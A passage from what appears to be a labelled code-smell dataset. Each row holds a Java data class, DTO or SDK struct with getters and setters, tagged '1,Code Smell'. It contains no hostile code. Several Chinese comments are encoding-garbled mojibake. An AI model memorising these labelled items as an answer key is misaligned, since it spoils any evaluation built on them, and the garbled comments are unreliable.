  public LineageTable(){
  }
  public LineageTable(  String id,  String name){
    this.id=id;
    this.name=name;
    this.columns=new ArrayList<>();
  }
  public static LineageTable build(  String id,  String name){
    return new LineageTable(id,name);
  }
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public List<LineageColumn> getColumns(){
    return columns;
  }
  public void setColumns(  List<LineageColumn> columns){
    this.columns=columns;
  }
}",1,Code Smell
"/** 
 * Pojo to record of file change. 
 */
public static class FileChange {
  private final long snapshotId;
  private final BinaryRow partition;
  private final int bucket;
  private final List<DataFileMeta> beforeFiles;
  private final List<DataFileMeta> dataFiles;
  public FileChange(  long snapshotId,  BinaryRow partition,  int bucket,  List<DataFileMeta> beforeFiles,  List<DataFileMeta> dataFiles){
    this.snapshotId=snapshotId;
    this.partition=partition;
    this.bucket=bucket;
    this.beforeFiles=beforeFiles;
    this.dataFiles=dataFiles;
  }
  public long snapshotId(){
    return snapshotId;
  }
  public BinaryRow partition(){
    return partition;
  }
  public int bucket(){
    return bucket;
  }
  public List<DataFileMeta> beforeFiles(){
    return beforeFiles;
  }
  public List<DataFileMeta> dataFiles(){
    return dataFiles;
  }
  @Override public String toString(){
    return ""FileChange{"" + ""snapshotId="" + snapshotId + "", partition=""+ partition+ "", bucket=""+ bucket+ "", beforeFiles=""+ beforeFiles+ "", dataFiles=""+ dataFiles+ '}';
  }
}
",1,Code Smell
"public static class TeacherJson {
  private static final long serialVersionUID=1L;
  @JsonProperty(""user_serial"") private Long userSerial;
  @JsonProperty(""user_name"") private String userName;
  private List<String> codes;
  @JsonProperty(""dept_list"") private List<DeptList> deptList;
  @JsonProperty(""manage_class_ids"") private List<DeptList> manageClassIds;
  @JsonProperty(""user_deps"") private List<String> userDeps;
  public Long getUserSerial(){
    return userSerial;
  }
  public void setUserSerial(  Long userSerial){
    this.userSerial=userSerial;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public List<String> getCodes(){
    return codes;
  }
  public void setCodes(  List<String> codes){
    this.codes=codes;
  }
  public List<DeptList> getDeptList(){
    return deptList;
  }
  public void setDeptList(  List<DeptList> deptList){
    this.deptList=deptList;
  }
  public List<DeptList> getManageClassIds(){
    return manageClassIds;
  }
  public void setManageClassIds(  List<DeptList> manageClassIds){
    this.manageClassIds=manageClassIds;
  }
  public List<String> getUserDeps(){
    return userDeps;
  }
  public void setUserDeps(  List<String> userDeps){
    this.userDeps=userDeps;
  }
  public String toJson(){
    return JSON.toJSONString(this);
  }
  @Override public String toString(){
    return this.toJson();
  }
}",1,Code Smell
"public final class GProGetRecommendMyV2Req {
  byte[] adReq;
  String busiInfo;
  int businessType;
  byte[] cookies;
  int direction;
  boolean existRecommend;
  int refreshNum;
  GProBottomTabSourceInfo source;
  public GProGetRecommendMyV2Req(){
    this.source=new GProBottomTabSourceInfo();
    this.cookies=new byte[0];
    this.busiInfo="""";
    this.adReq=new byte[0];
  }
  public byte[] getAdReq(){
    return this.adReq;
  }
  public String getBusiInfo(){
    return this.busiInfo;
  }
  public int getBusinessType(){
    return this.businessType;
  }
  public byte[] getCookies(){
    return this.cookies;
  }
  public int getDirection(){
    return this.direction;
  }
  public boolean getExistRecommend(){
    return this.existRecommend;
  }
  public int getRefreshNum(){
    return this.refreshNum;
  }
  public GProBottomTabSourceInfo getSource(){
    return this.source;
  }
  public String toString(){
    return ""GProGetRecommendMyV2Req{businessType="" + this.businessType + "",direction=""+ this.direction+ "",refreshNum=""+ this.refreshNum+ "",source=""+ this.source+ "",cookies=""+ this.cookies+ "",existRecommend=""+ this.existRecommend+ "",busiInfo=""+ this.busiInfo+ "",adReq=""+ this.adReq+ "",}"";
  }
  public GProGetRecommendMyV2Req(  int i2,  int i3,  int i4,  GProBottomTabSourceInfo gProBottomTabSourceInfo,  byte[] bArr,  boolean z,  String str,  byte[] bArr2){
    this.source=new GProBottomTabSourceInfo();
    this.cookies=new byte[0];
    this.busiInfo="""";
    this.adReq=new byte[0];
    this.businessType=i2;
    this.direction=i3;
    this.refreshNum=i4;
    this.source=gProBottomTabSourceInfo;
    this.cookies=bArr;
    this.existRecommend=z;
    this.busiInfo=str;
    this.adReq=bArr2;
  }
}",1,Code Smell
"public final class GProWorldChannelInfos {
  String channelCover;
  String channelId;
  int channelMemberCount;
  int channelMemberMax;
  String guildId;
  ArrayList<GProUser> memberList;
  public GProWorldChannelInfos(){
    this.guildId="""";
    this.channelId="""";
    this.memberList=new ArrayList<>();
    this.channelCover="""";
  }
  public String getChannelCover(){
    return this.channelCover;
  }
  public String getChannelId(){
    return this.channelId;
  }
  public int getChannelMemberCount(){
    return this.channelMemberCount;
  }
  public int getChannelMemberMax(){
    return this.channelMemberMax;
  }
  public String getGuildId(){
    return this.guildId;
  }
  public ArrayList<GProUser> getMemberList(){
    return this.memberList;
  }
  public String toString(){
    return ""GProWorldChannelInfos{guildId="" + this.guildId + "",channelId=""+ this.channelId+ "",channelMemberMax=""+ this.channelMemberMax+ "",channelMemberCount=""+ this.channelMemberCount+ "",memberList=""+ this.memberList+ "",channelCover=""+ this.channelCover+ "",}"";
  }
  public GProWorldChannelInfos(  String str,  String str2,  int i2,  int i3,  ArrayList<GProUser> arrayList,  String str3){
    this.guildId="""";
    this.channelId="""";
    this.memberList=new ArrayList<>();
    this.channelCover="""";
    this.guildId=str;
    this.channelId=str2;
    this.channelMemberMax=i2;
    this.channelMemberCount=i3;
    this.memberList=arrayList;
    this.channelCover=str3;
  }
}",1,Code Smell
"/** 
 * @company :www.dtstack.com
 * @Author :shiFang
 * @Date :2020-09-11 16:26
 * @Description :
 */
public class PromtheusMetrics {
  private String status;
  private StreamMetricData data;
  public String getStatus(){
    return status;
  }
  public void setStatus(  String status){
    this.status=status;
  }
  public StreamMetricData getData(){
    return data;
  }
  public void setData(  StreamMetricData data){
    this.data=data;
  }
}",1,Code Smell
"public class ResultDTO {
  private String command;
  private String resultStr;
  public String getCommand(){
    return command;
  }
  public void setCommand(  String command){
    this.command=command;
  }
  public String getResultStr(){
    return resultStr;
  }
  public void setResultStr(  String resultStr){
    this.resultStr=resultStr;
  }
}
",1,Code Smell
"class TestJson2 {
  private String test1;
  private String test2;
  public String getTest1(){
    return test1;
  }
  public void setTest1(  String test1){
    this.test1=test1;
  }
  public String getTest2(){
    return test2;
  }
  public void setTest2(  String test2){
    this.test2=test2;
  }
}",1,Code Smell
"public final class SearchStranger implements IKernelModel {
  Integer ageMax;
  Integer ageMin;
  Boolean checkNick;
  String countryCode;
  Integer gender;
  String keyWords;
  public SearchStranger(){
  }
  public Integer getAgeMax(){
    return this.ageMax;
  }
  public Integer getAgeMin(){
    return this.ageMin;
  }
  public Boolean getCheckNick(){
    return this.checkNick;
  }
  public String getCountryCode(){
    return this.countryCode;
  }
  public Integer getGender(){
    return this.gender;
  }
  public String getKeyWords(){
    return this.keyWords;
  }
  public void setAgeMax(  Integer num){
    this.ageMax=num;
  }
  public void setAgeMin(  Integer num){
    this.ageMin=num;
  }
  public void setCheckNick(  Boolean bool){
    this.checkNick=bool;
  }
  public void setCountryCode(  String str){
    this.countryCode=str;
  }
  public void setGender(  Integer num){
    this.gender=num;
  }
  public void setKeyWords(  String str){
    this.keyWords=str;
  }
  public String toString(){
    return ""SearchStranger{countryCode="" + this.countryCode + "",keyWords=""+ this.keyWords+ "",gender=""+ this.gender+ "",ageMin=""+ this.ageMin+ "",ageMax=""+ this.ageMax+ "",checkNick=""+ this.checkNick+ "",}"";
  }
  public SearchStranger(  String str,  String str2,  Integer num,  Integer num2,  Integer num3,  Boolean bool){
    this.countryCode=str;
    this.keyWords=str2;
    this.gender=num;
    this.ageMin=num2;
    this.ageMax=num3;
    this.checkNick=bool;
  }
}",1,Code Smell
"public static class DEV_EVENT_SNAPMANUAL extends SdkStructure {
  public int nChannelID;
  public byte[] szName=new byte[NET_EVENT_NAME_LEN];
  public byte[] bReserved1=new byte[4];
  public double PTS;
  public NET_TIME_EX UTC;
  public int nEventID;
  public NET_EVENT_FILE_INFO stuFileInfo;
  public byte byImageIndex;
  public int dwSnapFlagMask;
  public byte[] bReserved=new byte[1024];
}",1,Code Smell
"public static class NET_IN_GET_CAMERA_STATEINFO extends SdkStructure {
  public int dwSize;
  public int bGetAllFlag;
  public int nValidNum;
  public int[] nChannels=new int[NET_MAX_CAMERA_CHANNEL_NUM];
  public NET_IN_GET_CAMERA_STATEINFO(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"/** 
 * @author QingtaiJiang
 * @date 2023/4/27 18:23
 * @email qingtaij@163.com
 */
public class Cmd {
  String devId;
  Long packageNo;
  String msgId;
  String respId;
  Rs rs;
  public Cmd(){
  }
  public Cmd(  Builder builder){
    this.devId=builder.devId;
    this.packageNo=builder.packageNo;
    this.msgId=builder.msgId;
    this.respId=builder.respId;
    this.rs=builder.rs;
  }
  public String getDevId(){
    return devId;
  }
  public void setDevId(  String devId){
    this.devId=devId;
  }
  public Long getPackageNo(){
    return packageNo;
  }
  public void setPackageNo(  Long packageNo){
    this.packageNo=packageNo;
  }
  public String getMsgId(){
    return msgId;
  }
  public void setMsgId(  String msgId){
    this.msgId=msgId;
  }
  public String getRespId(){
    return respId;
  }
  public void setRespId(  String respId){
    this.respId=respId;
  }
  public Rs getRs(){
    return rs;
  }
  public void setRs(  Rs rs){
    this.rs=rs;
  }
public static class Builder {
    String devId;
    Long packageNo;
    String msgId;
    String respId;
    Rs rs;
    public Builder setDevId(    String devId){
      this.devId=devId.replaceFirst(""^0*"","""");
      return this;
    }
    public Builder setPackageNo(    Long packageNo){
      this.packageNo=packageNo;
      return this;
    }
    public Builder setMsgId(    String msgId){
      this.msgId=msgId;
      return this;
    }
    public Builder setRespId(    String respId){
      this.respId=respId;
      return this;
    }
    public Builder setRs(    Rs re){
      this.rs=re;
      return this;
    }
    public Cmd build(){
      return new Cmd(this);
    }
  }
  @Override public String toString(){
    return ""Cmd{"" + ""devId='"" + devId + '\''+ "", packageNo=""+ packageNo+ "", msgId='""+ msgId+ '\''+ "", respId='""+ respId+ '\''+ "", rs=""+ rs+ '}';
  }
}",1,Code Smell
"public static class SplitPositionOption {
  public final int iconResId;
  public final int textResId;
  @StagePosition public final int stagePosition;
  @StageType public final int mStageType;
  public SplitPositionOption(  int iconResId,  int textResId,  int stagePosition,  int stageType){
    this.iconResId=iconResId;
    this.textResId=textResId;
    this.stagePosition=stagePosition;
    mStageType=stageType;
  }
}
",1,Code Smell
"/** 
 * EXPERT: A unique Identifier/Description for each item in the FieldCache. Can be useful for logging/debugging.
 * @lucene.experimental
 */
public final class CacheEntry {
  private final Object readerKey;
  private final String fieldName;
  private final Class<?> cacheType;
  private final Object custom;
  private final Accountable value;
  public CacheEntry(  IndexReader.CacheKey readerKey,  String fieldName,  Class<?> cacheType,  Object custom,  Accountable value){
    this.readerKey=readerKey;
    this.fieldName=fieldName;
    this.cacheType=cacheType;
    this.custom=custom;
    this.value=value;
  }
  public Object getReaderKey(){
    return readerKey;
  }
  public String getFieldName(){
    return fieldName;
  }
  public Class<?> getCacheType(){
    return cacheType;
  }
  public Object getCustom(){
    return custom;
  }
  public Accountable getValue(){
    return value;
  }
  /** 
 * The most recently estimated size of the value, null unless estimateSize has been called. 
 */
  public String getEstimatedSize(){
    long bytesUsed=value == null ? 0L : value.ramBytesUsed();
    return RamUsageEstimator.humanReadableUnits(bytesUsed);
  }
  @Override public String toString(){
    StringBuilder b=new StringBuilder(100);
    b.append(""segment='"").append(getReaderKey().toString()).append(""', "");
    b.append(""field='"").append(getFieldName()).append(""', "");
    String s=getEstimatedSize();
    b.append(""size =~ "").append(s);
    return b.toString();
  }
}",1,Code Smell
"/** 
 * 浠撳簱鍟嗗搧搴撳瓨鏄庣粏琛�
 * @author lixiaoyang 2022-02-10 13:14:42
 */
@ApiModel(""浠撳簱鍟嗗搧搴撳瓨鏄庣粏琛�"") @ModifyAudit @VersionAudit @Data @JsonInclude(value=JsonInclude.Include.NON_NULL) @Table(name=""sstock_goods_stock_detail"") public class GoodsStockDetail extends AuditDomain {
  public static final String FIELD_ID=""id"";
  public static final String FIELD_TENANT_ID=""tenantId"";
  public static final String FIELD_WAREHOUSE_CODE=""warehouseCode"";
  public static final String FIELD_SKU_CODE=""skuCode"";
  public static final String FIELD_STOCK_NUM=""stockNum"";
  @ApiModelProperty(""涓婚敭"") @Id @GeneratedValue private Long id;
  @ApiModelProperty(value=""绉熸埛Id"") private Long tenantId;
  @ApiModelProperty(value=""浠撳簱code"",required=true) @NotNull private String warehouseCode;
  @ApiModelProperty(value=""浠撳簱id"") private Long warehouseId;
  @ApiModelProperty(value=""sku缂栫爜"",required=true) @NotBlank private String skuCode;
  @ApiModelProperty(value=""鍦ㄥ簱搴撳瓨"",required=true) @NotNull private BigDecimal stockNum;
  @ApiModelProperty(value=""鍙樻洿鏁伴噺"",required=true) @Transient private BigDecimal changeNum;
  @ApiModelProperty(value=""鍙樻洿鍓嶅疄闄呭簱瀛樻暟閲�"",required=true) @Transient private BigDecimal preRealNum;
}",1,Code Smell
"/** 
 * @author DaPorkchop_
 */
@AllArgsConstructor @NoArgsConstructor public class HeightmapLocalAttributes {
  @Attribute public int state;
  @FieldsAsArrayAttribute(attribute=@Attribute(name=""light""),names={""lightBlock"",""lightSky""},scalarType=@ScalarType(convert={@ScalarConvert(ScalarConvert.Type.TO_UNSIGNED),@ScalarConvert(value=ScalarConvert.Type.TO_FLOAT,normalized=true)}),transform=@ArrayTransform(ArrayTransform.Type.TO_VECTOR)) public byte lightBlock;
  public byte lightSky;
  @Attribute @ScalarType(expand=@ScalarExpand(value=ScalarExpand.Type.INT_ARGB8_TO_BYTE_VECTOR_RGBA,alpha=false,thenConvert=@ScalarConvert(value=ScalarConvert.Type.TO_FLOAT,normalized=true))) public int color;
  @FieldsAsArrayAttribute(attribute=@Attribute(name=""posHoriz""),names={""posHorizX"",""posHorizZ""},scalarType=@ScalarType(convert=@ScalarConvert(ScalarConvert.Type.TO_UNSIGNED)),transform=@ArrayTransform(ArrayTransform.Type.TO_VECTOR)) public byte posHorizX;
  public byte posHorizZ;
  @Attribute @ScalarType(convert=@ScalarConvert(ScalarConvert.Type.TO_UNSIGNED)) public int heightInt;
  @Attribute @ScalarType(convert={@ScalarConvert(ScalarConvert.Type.TO_UNSIGNED),@ScalarConvert(value=ScalarConvert.Type.TO_FLOAT,normalized=false)}) public byte heightFrac;
}",1,Code Smell
"public static class NET_VIS_SCENE_IMAGE extends SdkStructure {
  public int nOffset;
  public int nLength;
  public int nWidth;
  public int nHeight;
  public byte[] byReserved=new byte[64];
}",1,Code Smell
"/** 
 * All switch entries for naming.
 * @author nkorange
 */
public class SwitchEntry {
  public static final String BATCH=""batch"";
  public static final String DISTRO_THRESHOLD=""distroThreshold"";
  public static final String CLIENT_BEAT_INTERVAL=""clientBeatInterval"";
  public static final String PUSH_VERSION=""pushVersion"";
  public static final String CLIENT_JAVA=""java"";
  public static final String CLIENT_C=""c"";
  public static final String CLIENT_GO=""go"";
  public static final String CLIENT_PYTHON=""python"";
  public static final String PUSH_CACHE_MILLIS=""pushCacheMillis"";
  public static final String DEFAULT_CACHE_MILLIS=""defaultCacheMillis"";
  public static final String MASTERS=""masters"";
  public static final String DISTRO=""distro"";
  public static final String CHECK=""check"";
  public static final String PUSH_ENABLED=""pushEnabled"";
  public static final String SERVICE_STATUS_SYNC_PERIOD=""serviceStatusSynchronizationPeriodMillis"";
  public static final String SERVER_STATUS_SYNC_PERIOD=""serverStatusSynchronizationPeriodMillis"";
  public static final String HEALTH_CHECK_TIMES=""healthCheckTimes"";
  public static final String DISABLE_ADD_IP=""disableAddIP"";
  public static final String SEND_BEAT_ONLY=""sendBeatOnly"";
  public static final String LIMITED_URL_MAP=""limitedUrlMap"";
  public static final String ENABLE_STANDALONE=""enableStandalone"";
  public static final int MIN_PUSH_CACHE_TIME_MIILIS=10000;
  public static final int MIN_CACHE_TIME_MIILIS=1000;
  public static final int MIN_SERVICE_SYNC_TIME_MIILIS=5000;
  public static final int MIN_SERVER_SYNC_TIME_MIILIS=15000;
  public static final String ACTION_ADD=""add"";
  public static final String ACTION_REPLACE=""replace"";
  public static final String ACTION_VIEW=""view"";
  public static final String ACTION_DELETE=""delete"";
  public static final String ACTION_UPDATE=""update"";
  public static final String ACTION_CLEAN=""clean"";
  public static final String ACTION_OVERVIEW=""overview"";
  public static final String PARAM_JSON=""json"";
  public static final String OVERRIDDEN_SERVER_STATUS=""overriddenServerStatus"";
  public static final String DEFAULT_INSTANCE_EPHEMERAL=""defaultInstanceEphemeral"";
}",1,Code Smell
"/** 
 * Discovery configuration of Consul.
 * @author Haotian Zhang
 */
@ConfigurationProperties(""spring.cloud.consul"") public class ConsulContextProperties {
  /** 
 * Host of consul(or consul agent).
 */
  private String host;
  private int port;
  private boolean enabled=false;
  @Value(""${spring.cloud.consul.discovery.register:#{'true'}}"") private boolean register;
  @Value(""${spring.cloud.consul.discovery.enabled:#{'true'}}"") private boolean discoveryEnabled;
  @Value(""${spring.cloud.consul.discovery.instance-id:}"") private String instanceId;
  @Value(""${spring.cloud.consul.discovery.service-name:${spring.application.name:}}"") private String serviceName;
  @Value(""${spring.cloud.consul.discovery.ip-address:}"") private String ipAddress;
  @Value(""${spring.cloud.consul.discovery.prefer-ip-address:#{'false'}}"") private boolean preferIpAddress;
  @Value(""${consul.token:${CONSUL_TOKEN:${spring.cloud.consul.token:${SPRING_CLOUD_CONSUL_TOKEN:${spring.cloud.consul.discovery.acl-token:}}}}}"") private String aclToken;
  public String getHost(){
    return host;
  }
  public void setHost(  String host){
    this.host=host;
  }
  public int getPort(){
    return port;
  }
  public void setPort(  int port){
    this.port=port;
  }
  public boolean isEnabled(){
    return enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
  public boolean isRegister(){
    return register;
  }
  public void setRegister(  boolean register){
    this.register=register;
  }
  public boolean isDiscoveryEnabled(){
    return discoveryEnabled;
  }
  public void setDiscoveryEnabled(  boolean discoveryEnabled){
    this.discoveryEnabled=discoveryEnabled;
  }
  public String getInstanceId(){
    return instanceId;
  }
  public void setInstanceId(  String instanceId){
    this.instanceId=instanceId;
  }
  public String getServiceName(){
    return serviceName;
  }
  public void setServiceName(  String serviceName){
    this.serviceName=serviceName;
  }
  public String getIpAddress(){
    return ipAddress;
  }
  public void setIpAddress(  String ipAddress){
    this.ipAddress=ipAddress;
  }
  public boolean isPreferIpAddress(){
    return preferIpAddress;
  }
  public void setPreferIpAddress(  boolean preferIpAddress){
    this.preferIpAddress=preferIpAddress;
  }
  public String getAclToken(){
    return aclToken;
  }
  public void setAclToken(  String aclToken){
    this.aclToken=aclToken;
  }
}
",1,Code Smell
"/** 
 * @ClassName SerialData
 * @Author 闅斿灏忕帇瀛 981011512@qq.com
 * @Date 2020/5/3/003 10:18
 * @Version 1.0
 */
public class SerialData implements Serializable {
  private Integer serialChannel;
  private Object data;
  private Integer dataLen;
  private Integer channel;
  private String serialno;
  private String ipaddr;
  private String deviceName;
  public Integer getSerialChannel(){
    return serialChannel;
  }
  public void setSerialChannel(  Integer serialChannel){
    this.serialChannel=serialChannel;
  }
  public Object getData(){
    return data;
  }
  public void setData(  Object data){
    this.data=data;
  }
  public Integer getDataLen(){
    return dataLen;
  }
  public void setDataLen(  Integer dataLen){
    this.dataLen=dataLen;
  }
  public Integer getChannel(){
    return channel;
  }
  public void setChannel(  Integer channel){
    this.channel=channel;
  }
  public String getSerialno(){
    return serialno;
  }
  public void setSerialno(  String serialno){
    this.serialno=serialno;
  }
  public String getIpaddr(){
    return ipaddr;
  }
  public void setIpaddr(  String ipaddr){
    this.ipaddr=ipaddr;
  }
  public String getDeviceName(){
    return deviceName;
  }
  public void setDeviceName(  String deviceName){
    this.deviceName=deviceName;
  }
}",1,Code Smell
"public static class NET_OUT_WM_GET_COLLECTIONS extends SdkStructure {
  public int dwSize;
  public Pointer pCollections;
  public int nMaxCollectionsCount;
  public int nCollectionsCount;
  public NET_OUT_WM_GET_COLLECTIONS(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public class Resource {
  public Resource(){
  }
  public Resource(  String fileName,  String uploadedFileName,  int size,  String contentType,  String key){
    this.uploadedFileName=uploadedFileName;
    this.fileName=fileName;
    this.size=size;
    this.contentType=contentType;
    this.key=key;
  }
  private String uploadedFileName;
  /** 
 * @return the file name of the upload as provided in the form submission
 */
  private String fileName;
  /** 
 * @return the size of the upload, in bytes
 */
  private int size;
  private String contentType;
  /** 
 * file header key
 */
  private String key;
  public String getKey(){
    return key;
  }
  public void setKey(  String key){
    this.key=key;
  }
  public String getUploadedFileName(){
    return uploadedFileName;
  }
  public void setUploadedFileName(  String uploadedFileName){
    this.uploadedFileName=uploadedFileName;
  }
  public String getFileName(){
    return fileName;
  }
  public void setFileName(  String fileName){
    this.fileName=fileName;
  }
  public int getSize(){
    return size;
  }
  public void setSize(  int size){
    this.size=size;
  }
  public String getContentType(){
    return contentType;
  }
  public void setContentType(  String contentType){
    this.contentType=contentType;
  }
}
",1,Code Smell
"/** 
 * harris
 */
public class CodeRequest extends Code {
  private String userName;
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  private Map<String,Object> combine;
  public Map<String,Object> getCombine(){
    return combine;
  }
  public void setCombine(  Map<String,Object> combine){
    this.combine=combine;
  }
}
",1,Code Smell
"public class ConnectorVo {
  private String clusterName;
  private ConnectorJob connectorJob;
  public ConnectorJob getConnectorJob(){
    return connectorJob;
  }
  public void setConnectorJob(  ConnectorJob connectorJob){
    this.connectorJob=connectorJob;
  }
  public String getClusterName(){
    return clusterName;
  }
  public void setClusterName(  String clusterName){
    this.clusterName=clusterName;
  }
}
",1,Code Smell
"public class CloudResourceItemRequest {
  private String id;
  private String resourceId;
  private String hummerId;
  private String hummerName;
  private String resourceType;
  private String pluginId;
  private String pluginName;
  private String pluginIcon;
  private String accountId;
  private String accountName;
  private String regionId;
  private String regionName;
  private Long createTime;
  private Long updateTime;
  private String name;
  private Map<String,Object> combine;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getResourceId(){
    return resourceId;
  }
  public void setResourceId(  String resourceId){
    this.resourceId=resourceId;
  }
  public String getHummerId(){
    return hummerId;
  }
  public void setHummerId(  String hummerId){
    this.hummerId=hummerId;
  }
  public String getResourceType(){
    return resourceType;
  }
  public void setResourceType(  String resourceType){
    this.resourceType=resourceType;
  }
  public String getPluginId(){
    return pluginId;
  }
  public void setPluginId(  String pluginId){
    this.pluginId=pluginId;
  }
  public String getPluginName(){
    return pluginName;
  }
  public void setPluginName(  String pluginName){
    this.pluginName=pluginName;
  }
  public String getPluginIcon(){
    return pluginIcon;
  }
  public void setPluginIcon(  String pluginIcon){
    this.pluginIcon=pluginIcon;
  }
  public String getAccountId(){
    return accountId;
  }
  public void setAccountId(  String accountId){
    this.accountId=accountId;
  }
  public String getRegionId(){
    return regionId;
  }
  public void setRegionId(  String regionId){
    this.regionId=regionId;
  }
  public String getRegionName(){
    return regionName;
  }
  public void setRegionName(  String regionName){
    this.regionName=regionName;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public Map<String,Object> getCombine(){
    return combine;
  }
  public void setCombine(  Map<String,Object> combine){
    this.combine=combine;
  }
  public String getAccountName(){
    return accountName;
  }
  public void setAccountName(  String accountName){
    this.accountName=accountName;
  }
  public String getHummerName(){
    return hummerName;
  }
  public void setHummerName(  String hummerName){
    this.hummerName=hummerName;
  }
}
",1,Code Smell
"public class LinkageInfoDTO {
  private String sourceInfo;
  private List<String> targetInfoList;
  public String getSourceInfo(){
    return sourceInfo;
  }
  public void setSourceInfo(  String sourceInfo){
    this.sourceInfo=sourceInfo;
  }
  public List<String> getTargetInfoList(){
    return targetInfoList;
  }
  public void setTargetInfoList(  List<String> targetInfoList){
    this.targetInfoList=targetInfoList;
  }
}
",1,Code Smell
"/** 
 * A sink record contains key, row and partition, bucket information. 
 */
public class SinkRecord {
  private final BinaryRow partition;
  private final int bucket;
  private final BinaryRow primaryKey;
  private final InternalRow row;
  public SinkRecord(  BinaryRow partition,  int bucket,  BinaryRow primaryKey,  InternalRow row){
    checkArgument(partition.getRowKind() == RowKind.INSERT);
    checkArgument(primaryKey.getRowKind() == RowKind.INSERT);
    this.partition=partition;
    this.bucket=bucket;
    this.primaryKey=primaryKey;
    this.row=row;
  }
  public BinaryRow partition(){
    return partition;
  }
  public int bucket(){
    return bucket;
  }
  public BinaryRow primaryKey(){
    return primaryKey;
  }
  public InternalRow row(){
    return row;
  }
}
",1,Code Smell
"public static class NET_OPENDOOR_IMAGEINFO extends SdkStructure {
  public int nLibImageLen;
  public int nSnapImageLen;
  public Pointer pLibImage;
  public Pointer pSnapImage;
  public byte[] byReserved=new byte[1024];
}",1,Code Smell
"public static class CustomEntry extends MessageMicro<tencent.im.group.group_member_info.CustomEntry> {
  static final FieldMap __fieldMap__;
  public final PBBoolField bool_clicked;
  public final PBBytesField str_name;
  public final PBBytesField str_url;
  public final PBBytesField str_value;
  public final PBUInt64Field uint64_report_id;
static {
    ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
    Boolean bool=Boolean.FALSE;
    __fieldMap__=MessageMicro.initFieldMap(new int[]{10,18,24,34,40},new String[]{""str_name"",""str_value"",""bool_clicked"",""str_url"",""uint64_report_id""},new Object[]{byteStringMicro,byteStringMicro,bool,byteStringMicro,Long.valueOf(0L)},tencent.im.group.group_member_info.CustomEntry.class);
  }
  public CustomEntry(){
    ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
    this.str_name=PBField.initBytes(byteStringMicro);
    this.str_value=PBField.initBytes(byteStringMicro);
    this.bool_clicked=PBField.initBool(false);
    this.str_url=PBField.initBytes(byteStringMicro);
    this.uint64_report_id=PBField.initUInt64(0L);
  }
}",1,Code Smell
"public class TimerBean {
  public static final int TIMER_30_SECOND=30 * 1000;
  public static final int TIMER_1_MINUTE=60 * 1000;
  public static final int TIMER_10_MINUTE=10 * 60 * 1000;
  public static final int TIMER_30_MINUTE=30 * 60 * 1000;
  public static final int TIMER_OTHER=-1;
  private boolean isZeroTermux=false;
  private int timerNumber=TIMER_10_MINUTE;
  private long timerOtherNumber=0;
  public long getTimerOtherNumber(){
    return timerOtherNumber;
  }
  public void setTimerOtherNumber(  long timerOtherNumber){
    this.timerOtherNumber=timerOtherNumber;
  }
  public boolean isZeroTermux(){
    return isZeroTermux;
  }
  public void setIsZeroTermux(  boolean shell){
    isZeroTermux=shell;
  }
  public int getTimerNumber(){
    return timerNumber;
  }
  public void setTimerNumber(  int timerNumber){
    this.timerNumber=timerNumber;
  }
}",1,Code Smell
"/** 
 * Methodological information
 * @author zhp
 * @since 2022-11-30
 */
public class MethodInfo {
  /** 
 * The name of the method
 */
  private String name;
  /** 
 * Participation set
 */
  private List<ParamInfo> paramInfoList;
  /** 
 * Return value information
 */
  private ParamInfo returnInfo;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public List<ParamInfo> getParamInfoList(){
    return paramInfoList;
  }
  public void setParamInfoList(  List<ParamInfo> paramInfoList){
    this.paramInfoList=paramInfoList;
  }
  public ParamInfo getReturnInfo(){
    return returnInfo;
  }
  public void setReturnInfo(  ParamInfo returnInfo){
    this.returnInfo=returnInfo;
  }
}",1,Code Smell
"public static class NET_ITS_PLATE_RESULT extends Structure {
  public int dwSize;
  public int dwMatchNo;
  public byte byGroupNum;
  public byte byPicNo;
  public byte bySecondCam;
  public byte byFeaturePicNo;
  public byte byDriveChan;
  public byte byVehicleType;
  public byte byDetSceneID;
  public byte byVehicleAttribute;
  public short wIllegalType;
  public byte[] byIllegalSubType=new byte[8];
  public byte byPostPicNo;
  public byte byChanIndex;
  public short wSpeedLimit;
  public byte byChanIndexEx;
  public byte byRes2;
  public NET_DVR_PLATE_INFO struPlateInfo=new NET_DVR_PLATE_INFO();
  public NET_DVR_VEHICLE_INFO struVehicleInfo=new NET_DVR_VEHICLE_INFO();
  public byte[] byMonitoringSiteID=new byte[48];
  public byte[] byDeviceID=new byte[48];
  public byte byDir;
  public byte byDetectType;
  public byte byRelaLaneDirectionType;
  public byte byCarDirectionType;
  public int dwCustomIllegalType;
  public Pointer pIllegalInfoBuf;
  public byte byIllegalFromatType;
  public byte byPendant;
  public byte byDataAnalysis;
  public byte byYellowLabelCar;
  public byte byDangerousVehicles;
  public byte byPilotSafebelt;
  public byte byCopilotSafebelt;
  public byte byPilotSunVisor;
  public byte byCopilotSunVisor;
  public byte byPilotCall;
  public byte byBarrierGateCtrlType;
  public byte byAlarmDataType;
  public NET_DVR_TIME_V30 struSnapFirstPicTime=new NET_DVR_TIME_V30();
  public int dwIllegalTime;
  public int dwPicNum;
  public NET_ITS_PICTURE_INFO[] struPicInfo=new NET_ITS_PICTURE_INFO[6];
}",1,Code Smell
"public class FileSystemVo extends FileSystem {
  private Boolean favour;
  private String type;
  public Boolean getFavour(){
    return favour;
  }
  public void setFavour(  Boolean favour){
    this.favour=favour;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
}
",1,Code Smell
"/** 
 * 鑷畾涔夊紓甯革紝controller鍑虹幇閿欒鏃剁洿鎺ユ姏鍑哄紓甯哥敱鍏ㄥ眬寮傚父鎹曡幏骞惰繑鍥炵粨鏋�
 */
